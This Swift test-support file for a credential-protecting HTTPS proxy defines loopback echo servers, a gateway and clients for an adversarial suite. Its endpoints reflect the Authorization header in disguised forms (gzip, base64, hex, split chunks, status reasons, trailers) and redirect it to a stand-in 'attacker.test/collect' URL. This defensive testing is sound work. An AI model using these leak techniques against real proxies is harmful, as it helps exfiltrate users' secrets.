import Compression
import Foundation
import Network
import Synchronization

@testable import SecretKit

/// Loopback HTTPS servers for the proxy tests: a bound API with echo endpoints that reflect what they receive in every
/// encoding the adversarial suite tries, and an "attacker" that records everything it is sent.
final class EchoServer: Sendable {
    let name: String
    let port: UInt16
    private let listener: NWListener
    private let received = Mutex<[Data]>([])
    private let queue: DispatchQueue
    private let tasks = Mutex<[Task<Void, Never>]>([])

    /// Everything received (heads and bodies), for "did the canary arrive here" checks.
    var receivedBytes: Data { received.withLock { $0.reduce(Data(), +) } }
    var requestCount: Int { received.withLock { $0.count } }

    init(name: String, authority: CertificateAuthority?) async throws {
        self.name = name
        let parameters: NWParameters
        if let authority {
            let tls = NWProtocolTLS.Options()
            sec_protocol_options_set_local_identity(tls.securityProtocolOptions, sec_identity_create(try authority.identity(for: name))!)
            sec_protocol_options_add_tls_application_protocol(tls.securityProtocolOptions, "http/1.1")
            parameters = NWParameters(tls: tls)
        } else {
            parameters = .tcp
        }
        parameters.requiredLocalEndpoint = .hostPort(host: "127.0.0.1", port: .any)
        let listener = try NWListener(using: parameters)
        self.listener = listener
        let ready = Mutex(false)
        let queue = DispatchQueue(label: "echo-server", attributes: .concurrent)
        self.queue = queue
        let box = Mutex<EchoServer?>(nil)
        listener.newConnectionHandler = { connection in box.withLock { $0 }?.accept(connection) }
        port = try await withCheckedThrowingContinuation { (continuation: CheckedContinuation<UInt16, any Error>) in
            listener.stateUpdateHandler = { state in
                switch state {
                case .ready:
                    if ready.withLock({ done in defer { done = true }; return !done }) { continuation.resume(returning: listener.port!.rawValue) }
                case .failed(let error):
                    if ready.withLock({ done in defer { done = true }; return !done }) { continuation.resume(throwing: error) }
                default: break
                }
            }
            listener.start(queue: queue)
        }
        box.withLock { $0 = self }
    }

    func stop() {
        listener.cancel()
        tasks.withLock { $0.forEach { $0.cancel() } }
    }

    private func accept(_ connection: NWConnection) {
        let task = Task { [weak self] in
            guard let self else { return }
            let wire = WireConnection(connection, queue: self.queue)
            do {
                try await wire.start()
                while let headData = try await wire.readHead(), let head = HTTPHead(headData) {
                    let body = try await wire.readBody(head.requestFraming() ?? .empty, limit: 64 << 20)
                    self.received.withLock { $0.append(headData + body) }
                    let keep = try await self.respond(head, body: body, wire: wire)
                    if !keep { break }
                }
            } catch {}
            wire.cancel()
        }
        tasks.withLock { $0.append(task) }
    }

    /// Routes: `/v1/echo?enc=…` reflects headers and body; `/redirect?to=URL`; `/stream` never ends; `/big?mb=N`;
    /// `/ws` accepts an upgrade; anything else: 200 "ok".
    private func respond(_ head: HTTPHead, body: Data, wire: WireConnection) async throws -> Bool {
        let target = head.startLine[1]
        let components = URLComponents(string: "https://x" + target)
        let path = components?.path ?? target
        let query = Dictionary((components?.queryItems ?? []).map { ($0.name, $0.value ?? "") }, uniquingKeysWith: { a, _ in a })
        if path.hasSuffix("/echo") {
            let reflected = Data((head.fields.map { "\($0.name): \($0.value)" }.joined(separator: "\n") + "\n\n").utf8) + body
            let encoding = query["enc"] ?? "raw"
            var fields = [HTTPField("Content-Type", "text/plain")]
            var payload: Data
            switch encoding {
            case "gzip": payload = ScannerTests.gzip(reflected); fields.append(HTTPField("Content-Encoding", "gzip"))
            case "deflate": payload = ScannerTests.deflate(reflected); fields.append(HTTPField("Content-Encoding", "deflate"))
            case "br": payload = ScannerTests.brotli(reflected); fields.append(HTTPField("Content-Encoding", "br"))
            case "zstd": payload = reflected; fields.append(HTTPField("Content-Encoding", "zstd"))
            case "ce-twice":
                // Two Content-Encoding fields, each applied (AV02's sibling: only the first field was decoded).
                payload = ScannerTests.gzip(ScannerTests.gzip(reflected))
                fields += [HTTPField("Content-Encoding", "gzip"), HTTPField("Content-Encoding", "gzip")]
            case "te-gzip", "te-gzip-close": payload = ScannerTests.gzip(reflected)
            case "base64": payload = Data(reflected.base64EncodedString().utf8)
            case "hex": payload = Data(reflected.map { String(format: "%02x", $0) }.joined().utf8)
            case "url": payload = Data((String(decoding: reflected, as: UTF8.self).addingPercentEncoding(withAllowedCharacters: .alphanumerics) ?? "").utf8)
            case "json": payload = (try? JSONSerialization.data(withJSONObject: ["echo": String(decoding: reflected, as: UTF8.self)])) ?? Data()
            case "header":
                // The value goes back in a response header.
                let auth = head.fields.first("Authorization") ?? ""
                fields.append(HTTPField("X-Echo-Auth", auth))
                payload = Data("ok".utf8)
            case "location":
                let auth = head.fields.first("Authorization") ?? ""
                try await wire.send(HTTPHead(startLine: ["HTTP/1.1", "302", "Found"], fields: [
                    HTTPField("Location", "https://attacker.test/collect?k=" + (auth.addingPercentEncoding(withAllowedCharacters: .alphanumerics) ?? "")),
                    HTTPField("Content-Length", "0"),
                ]).serialized)
                return true
            default: payload = reflected
            }
            if encoding == "te-gzip" {
                // A transfer coding under the chunked framing (AV02).
                try await wire.send(HTTPHead(startLine: ["HTTP/1.1", "200", "OK"], fields: fields + [HTTPField("Transfer-Encoding", "gzip, chunked")]).serialized)
                try await wire.send(Data("\(String(payload.count, radix: 16))\r\n".utf8) + payload + Data("\r\n0\r\n\r\n".utf8))
                return true
            }
            if encoding == "te-gzip-close" {
                // A transfer coding without chunked: the body runs until the connection closes.
                try await wire.send(HTTPHead(startLine: ["HTTP/1.1", "200", "OK"], fields: fields + [HTTPField("Transfer-Encoding", "gzip"), HTTPField("Connection", "close")]).serialized + payload)
                return false
            }
            if encoding == "chunked" || encoding == "split" {
                // Chunked, with the value split across chunk boundaries (3-byte chunks).
                try await wire.send(HTTPHead(startLine: ["HTTP/1.1", "200", "OK"], fields: fields + [HTTPField("Transfer-Encoding", "chunked")]).serialized)
                var index = 0
                let size = encoding == "split" ? 3 : 1024
                while index < payload.count {
                    let piece = payload.subdata(in: index..<min(index + size, payload.count))
                    try await wire.send(Data("\(String(piece.count, radix: 16))\r\n".utf8) + piece + Data("\r\n".utf8))
                    index += size
                }
                try await wire.send(Data("0\r\n\r\n".utf8))
                return true
            }
            if encoding == "close" {
                try await wire.send(HTTPHead(startLine: ["HTTP/1.1", "200", "OK"], fields: fields + [HTTPField("Connection", "close")]).serialized + payload)
                return false
            }
            try await wire.send(HTTPHead(startLine: ["HTTP/1.1", "200", "OK"], fields: fields + [HTTPField("Content-Length", String(payload.count))]).serialized + payload)
            return true
        }
        // Metadata reflection (R02): the submitted Authorization value comes back outside headers and body.
        let auth = head.fields.first("Authorization") ?? ""
        if path.hasSuffix("/truncated") {
            // Announces 100 bytes, sends 10, closes: a response that ends early (not one that is too large).
            try await wire.send(Data("HTTP/1.1 200 OK\r\nContent-Length: 100\r\n\r\n0123456789".utf8))
            return false
        }
        if path.hasSuffix("/overflow-chunk") {
            // One byte, then a chunk size that overflows when added to what was read (AV09).
            try await wire.send(Data("HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n1\r\na\r\n7fffffffffffffff\r\n".utf8))
            return false
        }
        if path.hasSuffix("/reflect-reason") {
            try await wire.send(Data("HTTP/1.1 200 \(auth)\r\nContent-Length: 2\r\n\r\nok".utf8))
            return true
        }
        if path.hasSuffix("/reflect-interim") {
            try await wire.send(Data("HTTP/1.1 103 \(auth)\r\nX-Hint: \(auth)\r\n\r\nHTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok".utf8))
            return true
        }
        if path.hasSuffix("/reflect-encoding") {
            try await wire.send(Data("HTTP/1.1 200 OK\r\nContent-Encoding: x-\(auth.split(separator: " ").last ?? "")\r\nContent-Length: 2\r\n\r\nok".utf8))
            return true
        }
        if path.hasSuffix("/reflect-trailer") {
            try await wire.send(Data("HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\nTrailer: X-Echo\r\n\r\n2\r\nok\r\n0\r\nX-Echo: \(auth)\r\n\r\n".utf8))
            return true
        }
        if path.hasSuffix("/unsolicited-upgrade") {
            // Switches protocols although nobody asked, then writes the value raw.
            try await wire.send(Data("HTTP/1.1 101 Switching Protocols\r\nUpgrade: raw\r\nConnection: Upgrade\r\n\r\n\(auth)\n".utf8))
            return false
        }
        if path.hasSuffix("/redirect"), let to = query["to"] {
            try await wire.send(HTTPHead(startLine: ["HTTP/1.1", "302", "Found"], fields: [HTTPField("Location", to), HTTPField("Content-Length", "0")]).serialized)
            return true
        }
        if path.hasSuffix("/stream") {
            try await wire.send(HTTPHead(startLine: ["HTTP/1.1", "200", "OK"], fields: [HTTPField("Content-Type", "text/event-stream"), HTTPField("Transfer-Encoding", "chunked")]).serialized)
            for _ in 0..<600 {
                try await wire.send(Data("6\r\ndata:\n\r\n".utf8))
                try await Task.sleep(for: .milliseconds(100))
            }
            return false
        }
        if path.hasSuffix("/big") {
            let size = (Int(query["mb"] ?? "1") ?? 1) << 20
            try await wire.send(HTTPHead(startLine: ["HTTP/1.1", "200", "OK"], fields: [HTTPField("Content-Length", String(size))]).serialized)
            var sent = 0
            let chunk = Data(repeating: 0x61, count: 256 * 1024)
            while sent < size {
                try await wire.send(chunk.prefix(size - sent))
                sent += min(chunk.count, size - sent)
            }
            return true
        }
        if path.hasSuffix("/ws"), head.fields.first("Upgrade") != nil {
            try await wire.send(HTTPHead(startLine: ["HTTP/1.1", "101", "Switching Protocols"], fields: [HTTPField("Upgrade", "websocket"), HTTPField("Connection", "Upgrade")]).serialized)
            while let data = try await wire.readSome() {
                received.withLock { $0.append(data) }
                try await wire.send(data)
            }
            return false
        }
        try await wire.send(HTTPHead(startLine: ["HTTP/1.1", "200", "OK"], fields: [HTTPField("Content-Length", "3")]).serialized + Data("ok\n".utf8))
        return true
    }
}

/// Stands in for the container gateway in-process: accepts plain TCP, sends the scope preamble, then splices to the
/// proxy. (The live suite uses the real gateway container.)
final class TestGateway: Sendable {
    let port: UInt16
    private let listener: NWListener
    private let queue: DispatchQueue

    init(proxyPort: UInt16, token: String) async throws {
        let parameters = NWParameters.tcp
        parameters.requiredLocalEndpoint = .hostPort(host: "127.0.0.1", port: .any)
        let listener = try NWListener(using: parameters)
        self.listener = listener
        let queue = DispatchQueue(label: "test-gateway", attributes: .concurrent)
        self.queue = queue
        listener.newConnectionHandler = { client in
            Task {
                let a = WireConnection(client, queue: queue)
                let b = WireConnection(NWConnection(host: "127.0.0.1", port: NWEndpoint.Port(rawValue: proxyPort)!, using: .tcp), queue: queue)
                do {
                    try await a.start()
                    try await b.start()
                    try await b.send(Data("BCEGRESS \(token)\n".utf8))
                    await withTaskGroup(of: Void.self) { group in
                        group.addTask { while let d = try? await a.readSome() { try? await b.send(d) }; await b.sendEnd() }
                        group.addTask { while let d = try? await b.readSome() { try? await a.send(d) }; await a.sendEnd() }
                        await group.next()
                        try? await Task.sleep(for: .milliseconds(200))
                        a.cancel()
                        b.cancel()
                    }
                } catch {
                    a.cancel()
                    b.cancel()
                }
            }
        }
        let ready = Mutex(false)
        port = try await withCheckedThrowingContinuation { continuation in
            listener.stateUpdateHandler = { state in
                if case .ready = state, ready.withLock({ done in defer { done = true }; return !done }) {
                    continuation.resume(returning: listener.port!.rawValue)
                }
            }
            listener.start(queue: queue)
        }
    }

    func stop() { listener.cancel() }
}

/// URLSession through the test gateway, trusting the proxy's CA (as the container's trust store does).
final class ProxyClient: NSObject, URLSessionTaskDelegate, Sendable {
    let anchor: Data
    let followRedirects: Bool
    private let sessionBox = Mutex<URLSession?>(nil)

    init(gatewayPort: UInt16, anchor: Data, followRedirects: Bool = true) {
        self.anchor = anchor
        self.followRedirects = followRedirects
        super.init()
        let configuration = URLSessionConfiguration.ephemeral
        configuration.connectionProxyDictionary = [
            kCFNetworkProxiesHTTPEnable as String: true, kCFNetworkProxiesHTTPProxy as String: "127.0.0.1",
            kCFNetworkProxiesHTTPPort as String: Int(gatewayPort),
            "HTTPSEnable": true, "HTTPSProxy": "127.0.0.1", "HTTPSPort": Int(gatewayPort),
        ]
        configuration.httpShouldUsePipelining = false
        configuration.timeoutIntervalForRequest = 30
        sessionBox.withLock { $0 = URLSession(configuration: configuration, delegate: self, delegateQueue: nil) }
    }

    var session: URLSession { sessionBox.withLock { $0! } }

    func get(_ url: String, headers: [String: String] = [:], method: String = "GET", body: Data? = nil) async throws -> (Int, [String: String], Data) {
        var request = URLRequest(url: URL(string: url)!)
        request.httpMethod = method
        request.httpBody = body
        for (name, value) in headers { request.setValue(value, forHTTPHeaderField: name) }
        let (data, response) = try await session.data(for: request)
        let http = response as! HTTPURLResponse
        let fields = Dictionary(http.allHeaderFields.map { ("\($0.key)", "\($0.value)") }, uniquingKeysWith: { a, _ in a })
        return (http.statusCode, fields, data)
    }

    func urlSession(_ session: URLSession, task: URLSessionTask, didReceive challenge: URLAuthenticationChallenge) async
        -> (URLSession.AuthChallengeDisposition, URLCredential?) {
        guard let trust = challenge.protectionSpace.serverTrust else { return (.performDefaultHandling, nil) }
        SecTrustSetAnchorCertificates(trust, [SecCertificateCreateWithData(nil, anchor as CFData)!] as CFArray)
        SecTrustSetAnchorCertificatesOnly(trust, true)
        return SecTrustEvaluateWithError(trust, nil) ? (.useCredential, URLCredential(trust: trust)) : (.cancelAuthenticationChallenge, nil)
    }

    func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest) async -> URLRequest? {
        followRedirects ? request : nil
    }
}

/// A raw HTTP/1.1 client through the test gateway (absolute-form, plain http): returns every byte the proxy sent until it
/// closed, so the status line, interim heads and trailers are visible (URLSession hides them).
enum RawProxyClient {
    static func exchange(gatewayPort: UInt16, request: String, timeout: Duration = .seconds(20)) async throws -> Data {
        let queue = DispatchQueue(label: "raw-proxy-client")
        let wire = WireConnection(NWConnection(host: "127.0.0.1", port: NWEndpoint.Port(rawValue: gatewayPort)!, using: .tcp), queue: queue)
        try await wire.start()
        try await wire.send(Data(request.utf8))
        let watchdog = Task {
            try? await Task.sleep(for: timeout)
            wire.cancel()
        }
        defer { watchdog.cancel(); wire.cancel() }
        var received = Data()
        while let piece = try? await wire.readSome() { received.append(piece) }
        return received
    }
}
